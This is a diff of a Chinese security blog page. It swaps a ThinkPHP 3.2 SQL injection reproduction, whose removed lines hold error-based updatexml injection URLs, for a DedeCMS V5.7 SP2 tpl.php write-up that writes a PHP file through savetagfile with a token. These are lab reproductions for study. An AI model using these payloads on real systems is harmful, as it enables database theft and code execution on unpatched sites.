@@ -10,11 +10,9 @@
 
     <!--Description-->
     
-        <meta name="description" content="环境Windows server 2008 r2 + phptudy php5.3.29
-程序ThinkPHP3.2
-参考文章https://xz.aliyun.com/t/2629
-配置的文件已经打包设置好，将tinkphp.sql导入到数据库中。
-针对select() 和find()方法 ,有很">
+        <meta name="description" content="环境Windows + phptudy php5.3.29
+程序DedeCMS v 5.7 sp2
+漏洞复现登录后台后访问/dede/tpl.php?action=upload 获取token值然后访问/dede/tpl.php?action=savetagfile&amp;amp;filename=tes">
     
 
     <!--Author-->
@@ -24,7 +22,7 @@
 
     <!--Open Graph Title-->
     
-        <meta property="og:title" content="ThinkPHP3.2 框架sql注入漏洞(2018-08-23)"/>
+        <meta property="og:title" content="DedeCMS V5.7 SP2版本tpl.php存在代码执行漏洞复现"/>
     
 
     <!--Open Graph Description-->
@@ -46,7 +44,7 @@
 
     <!-- Title -->
     
-    <title>ThinkPHP3.2 框架sql注入漏洞(2018-08-23) - 代码审计漏洞实例深度剖析</title>
+    <title>DedeCMS V5.7 SP2版本tpl.php存在代码执行漏洞复现 - 代码审计漏洞实例深度剖析</title>
 
     <!-- Tachyons Core CSS -->
     <link rel="stylesheet" href="//unpkg.com/tachyons/css/tachyons.min.css">
@@ -114,8 +112,8 @@
     <!-- Title -->
     <div class="w-100 mw8 center vh-40 dt">
         <div class="dtc v-mid white">
-            <h1 class="f1-l f2-m tc tc-m tl-ns">ThinkPHP3.2 框架sql注入漏洞(2018-08-23)</h1>
-            <p class="f4 fw3 pab-100px tc tc-m tl-ns">2018-08-23</p>
+            <h1 class="f1-l f2-m tc tc-m tl-ns">DedeCMS V5.7 SP2版本tpl.php存在代码执行漏洞复现</h1>
+            <p class="f4 fw3 pab-100px tc tc-m tl-ns">2018-09-28</p>
         </div>
     </div>
 
@@ -135,13 +133,9 @@
                     
 
                     <!-- Main Post Content -->
-                    <h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Windows server 2008 r2 + phptudy php5.3.29</p>
-<h2 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h2><p>ThinkPHP3.2</p>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/2629" target="_blank" rel="noopener">https://xz.aliyun.com/t/2629</a></p>
-<p>配置的文件已经打包设置好，将tinkphp.sql导入到数据库中。</p>
-<p>针对select() 和find()方法 ,有很多地方可注，这里主要列举三个table，alias，where，更多还请自行跟踪一下parseSql的各个parseXXX方法，目测都是可行的，比如having,group等。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Table:</span><br><span class="line">http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[table]=user where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br><span class="line"></span><br><span class="line">Alias:</span><br><span class="line">http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[alias]=where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br><span class="line"></span><br><span class="line">Where:</span><br><span class="line">http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br></pre></td></tr></table></figure></p>
-<p>而delete()方法的话同样，这里粗略举三个例子，table,alias,where，但使用table和alias的时候，同时还必须保证where不为空<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">where:</span><br><span class="line">http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br><span class="line"></span><br><span class="line">alias: http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br><span class="line"></span><br><span class="line">table: http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[table]=user%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--&amp;id[where]=1</span><br></pre></td></tr></table></figure></p>
-<p><img src="http://anying.nos-eastchina1.126.net/ThinkPHP3.2%E5%9B%BE%E7%89%871.png" alt="img"></p>
+                    <h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Windows + phptudy php5.3.29</p>
+<h2 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h2><p>DedeCMS v 5.7 sp2</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>登录后台后<br>访问/dede/tpl.php?action=upload 获取token值<br><img src="http://anying.nos-eastchina1.126.net/dede%E5%9B%BE%E7%89%871.png" alt="1" title="1"><br>然后访问<br>/dede/tpl.php?action=savetagfile&amp;filename=test.lib.php&amp;content=&lt;?php phpinfo();?&gt;&amp;token=4742f06c5b9cad86dbf3120b2bd61736<br><img src="http://anying.nos-eastchina1.126.net/dede%E5%9B%BE%E7%89%872.png" alt="2" title="2"><br>文件就会生成到\include\taglib目录下 命名为test.lib.php<br>访问test.lib.php查看是否能访问<br><img src="http://anying.nos-eastchina1.126.net/dede%E5%9B%BE%E7%89%873.png" alt="3" title="3"></p>
 
                     
                     <!-- Tags Bottom -->
@@ -179,11 +173,23 @@
     <h3>Recent Posts</h3>
     
         <p>
+            <a href="/2018/09/30/ECShop_V2.7.3 sql/">ECShop_V2.7.3注入代码执行漏洞复现</a>
+        </p>
+    
+        <p>
             <a href="/2018/09/29/CVE-2015-8562/">Joomla 3.4.5 反序列化漏洞复现（CVE-2015-8562）</a>
         </p>
     
         <p>
-            <a href="/2018/08/23/ThinkPHP3.2_SQL_Injection(2018-08-23)/">ThinkPHP3.2 框架sql注入漏洞(2018-08-23)</a>
+            <a href="/2018/09/28/DedeCMS V5.7 SP2_tpl.php/">DedeCMS V5.7 SP2版本tpl.php存在代码执行漏洞复现</a>
+        </p>
+    
+        <p>
+            <a href="/2018/09/22/Z-BLOG Blind-XXE/">Z-BLOG Blind-XXE造成任意文件读取漏洞复现</a>
+        </p>
+    
+        <p>
+            <a href="/2018/09/20/ThinkPHP3.2_SQL_Injection(2018-08-23)/">ThinkPHP3.2 框架sql注入漏洞(2018-08-23)</a>
         </p>
     
 </div>
